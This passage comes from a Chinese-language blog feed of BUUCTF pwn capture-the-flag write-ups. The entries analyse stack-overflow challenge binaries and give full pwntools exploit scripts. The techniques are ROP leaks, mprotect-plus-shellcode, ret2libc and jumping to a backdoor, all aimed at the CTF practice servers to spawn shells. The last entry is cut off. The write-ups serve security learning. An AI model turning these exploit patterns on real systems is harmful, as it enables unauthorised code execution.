class="line">  gets(&amp;v4);<span class="comment">//漏洞函数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们找/bin/sh等字符串发现没有其中的字符串,但是搜索flag，有一个flag.txt,找到一个函数为get_secret()函数</p><p>get_secret()函数如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_secret</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  v0 = fopen(<span class="string">&quot;flag.txt&quot;</span>, &amp;unk_80CF91B);</span><br><span class="line">  fgets(&amp;fl4g, <span class="number">45</span>, v0);</span><br><span class="line">  <span class="keyword">return</span> fclose(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> fgets函数是读取一句字符串,读取到fl4g中fl4g的bss段</p><p>这个时候可以正常rop用write读出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line"><span class="comment">#io=process(&#x27;./not_the_same_3dsctf_2016&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26903</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss=<span class="number">0x080eca2d</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(<span class="number">0x80489a0</span>)+p32(elf.sym[<span class="string">&#x27;write&#x27;</span>])+p32(bss)+p32(<span class="number">1</span>)+p32(bss)+p32(<span class="number">42</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>之后看他们的博客有第2种办法这个办法,是我没有涉及到的思路,我们看向wp吧,来解析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26903</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line">read_addr=elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">mprotect=<span class="number">0x806ED40</span></span><br><span class="line">addr=<span class="number">0x80eb000</span></span><br><span class="line">p3_ret=<span class="number">0x806fcc8</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload  =<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(mprotect)+p32(p3_ret)</span><br><span class="line">payload +=p32(addr)+p32(<span class="number">0x100</span>)+p32(<span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line">payload +=p32(read_addr)+p32(p3_ret)</span><br><span class="line"></span><br><span class="line">payload +=p32(<span class="number">0</span>)+p32(addr)+p32(<span class="built_in">len</span>(shellcode))+p32(addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>他这里是用mprotect函数，可以用它来修改我们内存栈的权限，让它可读可写可执行，接着让写入shellcode，然后执行获取shell</p><p>首先<code>0x2d</code>是main函数中栈空间的大小，它的下一个位置就是ret指令对应的返回地址了</p><p>p32(mprotect)就是mprotect函数的地址，接下来的p32(pop)是为了保持栈平衡而将后面压入的三个参数从栈上弹出，弹出后我们并不使用它，就是为了控制栈的结构，p32(pop)的位置也同样是执行完mprotect后的返回地址，pop对应的指令为 pop esi ; pop ebx ; pop edx ; ret，最后ret就跳转到p32(read_addr)这里了</p><p>同理，<code>p32(read_addr)</code>的下一个<code>p32(addr)</code>也是执行完read函数后跳转的地址，后面是read的三个参数</p><p>整个思路就是，利用<code>mprotect</code>函数修改bss段为<code>0x7</code>即<code>0b111</code>，可读可写可执行权限，然后利用read函数读入shellcode，最后跳转到shellcode的位置，就成功拿到shell了</p><p>小结:</p><p>好像也是可以用printf输出flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;not-the-same-3dsctf-2016&quot;&gt;&lt;a href=&quot;#not-the-same-3dsctf-2016&quot; class=&quot;headerlink&quot; title=&quot;not_the_same_3dsctf_2016&quot;&gt;&lt;/a&gt;not_the_same_3</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-ciscn_2019_en_2</title>
    <link href="http://example.com/2022/01/16/buuctf-ciscn-2019-en-2/"/>
    <id>http://example.com/2022/01/16/buuctf-ciscn-2019-en-2/</id>
    <published>2022-01-16T11:40:32.000Z</published>
    <updated>2022-01-16T11:41:11.936Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h1><p>正常看保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO//没开</span><br><span class="line">Stack:    No canary found//没开</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)//没开</span><br></pre></td></tr></table></figure><p>然后我们看向代码main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EEEEEEE                            hh      iii                &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;====================================================================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to this Encryption machine\n&quot;</span>);</span><br><span class="line">  begin(<span class="string">&quot;Welcome to this Encryption machine\n&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      fflush(<span class="number">0LL</span>);</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;I think you can do it by yourself&quot;</span>);</span><br><span class="line">      begin(<span class="string">&quot;I think you can do it by yourself&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye!&quot;</span>);<span class="comment">//输入3,输出Bye，然后退出</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    encrypt();<span class="comment">//这个函数有漏洞点</span></span><br><span class="line">    begin(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Something Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>encrypt函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">encrypt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>);</span><br><span class="line">  gets(s);<span class="comment">//漏洞函数</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)x;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )<span class="comment">//判断是否大于或等于</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span> )</span><br><span class="line">          s[x] ^= <span class="number">0xC</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[x] ^= <span class="number">0xD</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      s[x] ^= <span class="number">0xE</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    ++x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ciphertext&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有getshell函数,没有system,想法是泄漏libc来打远程,然后用\0来绕过strlen的判断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27062</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./ciscn_2019_en_2&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_2019_en_2&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">rdi_ret=<span class="number">0x0000000000400c83</span></span><br><span class="line">ret_addr=<span class="number">0x00000000004006b9</span></span><br><span class="line">main_addr=<span class="number">0x0000000000400B28</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x58</span>-<span class="number">1</span>)+p64(rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;choice!\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;encrypted\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#接受puts_addr的真实地址,</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;puts_addr=&quot;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice!\n&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x58</span>-<span class="number">1</span>)+p64(ret_addr)+p64(rdi_ret)+p64(binsh_addr)+p64(sys_addr)+p64(main_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ciscn-2019-en-2&quot;&gt;&lt;a href=&quot;#ciscn-2019-en-2&quot; class=&quot;headerlink&quot; title=&quot;ciscn_2019_en_2&quot;&gt;&lt;/a&gt;ciscn_2019_en_2&lt;/h1&gt;&lt;p&gt;正常看保护&lt;/p&gt;
&lt;figure </summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-bjdctf_2020_babystack</title>
    <link href="http://example.com/2022/01/14/buuctf-bjdctf-2020-babystack/"/>
    <id>http://example.com/2022/01/14/buuctf-bjdctf-2020-babystack/</id>
    <published>2022-01-14T13:30:47.000Z</published>
    <updated>2022-01-14T13:31:37.373Z</updated>
    
    <content type="html"><![CDATA[<h1 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h1><p>查看保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO//没开</span><br><span class="line">Stack:    No canary found//没开</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)//没开</span><br></pre></td></tr></table></figure><p>main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  LODWORD(nbytes) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;**********************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*     Welcome to the BJDCTF!     *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* And Welcome to the bin world!  *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*  Let&#x27;s try to pwn the world!   *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* Please told me u answer loudly!*&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Are u ready?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Please input the length of your name:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]What&#x27;s u name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实由上而下来看是要你制造一个溢出漏洞,nbytes这个变量就是你要弄buf的大小</p><p>backdoor函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 backdoor()</span><br><span class="line">&#123;</span><br><span class="line">  system(&quot;/bin/sh&quot;);</span><br><span class="line">  return 1LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28616</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./bjdctf_2020_babystack&#x27;)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;50&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">payload=<span class="number">0x18</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0x4006E6</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;bjdctf-2020-babystack&quot;&gt;&lt;a href=&quot;#bjdctf-2020-babystack&quot; class=&quot;headerlink&quot; title=&quot;bjdctf_2020_babystack&quot;&gt;&lt;/a&gt;bjdctf_2020_babystack&lt;/</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-get_started_3dsctf_2016</title>
    <link href="http://example.com/2022/01/14/buuctf-get-started-3dsctf-2016/"/>
    <id>http://example.com/2022/01/14/buuctf-get-started-3dsctf-2016/</id>
    <published>2022-01-14T12:43:29.000Z</published>
    <updated>2022-01-14T12:44:21.261Z</updated>
    
    <content type="html"><![CDATA[<h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><p>常看保护</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO<span class="comment">//没开</span></span><br><span class="line">Stack:    No canary found<span class="comment">//没开</span></span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span> <span class="comment">//没开</span></span></span><br></pre></td></tr></table></figure><p>看main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+4h] [ebp-38h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Qual a palavrinha magica? &quot;</span>, v4);</span><br><span class="line">  gets(&amp;v4);<span class="comment">//漏洞点</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get_flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">get_flag</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v4; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v6; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0x308CD64F</span> &amp;&amp; a2 == <span class="number">0x195719D1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rt&quot;</span>);</span><br><span class="line">    v3 = v2;</span><br><span class="line">    v4 = getc(v2);</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">255</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = (<span class="keyword">char</span>)v4;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(v5);</span><br><span class="line">        v6 = getc(v3);</span><br><span class="line">        v5 = (<span class="keyword">char</span>)v6;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v6 != <span class="number">255</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(v3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要满足条件就读取flag.txt</p><p>那个时候我一直在想怎么弄,直接返回函数是怎么传参,怎么才能保护栈的空间奔溃</p><p>大概就是这么布局：’a’*offset + ‘ebp’ + get_flag + get_flag的返回地址 + 参数1 + 参数2</p><p>不过发现要有什么限制，必须维护好栈，所以地找一个函数来退出。于是利用了exit函数(这个意思是接受数据的时候,要让他正常退出,不然的话不会返回数据)</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 